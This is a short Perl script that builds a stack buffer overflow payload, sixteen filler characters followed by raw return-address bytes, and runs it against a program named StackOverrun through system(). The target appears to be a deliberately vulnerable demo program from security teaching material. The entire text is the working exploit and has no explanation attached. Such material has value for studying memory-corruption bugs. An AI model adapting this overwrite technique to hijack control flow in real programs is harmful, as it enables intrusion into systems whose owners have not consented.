$arg = "ABCDEFGHIJKLMNOP"."\x90\x11\x40";
$cmd = "StackOverrun ".$arg;
print $arg;
print $cmd;

system($cmd);

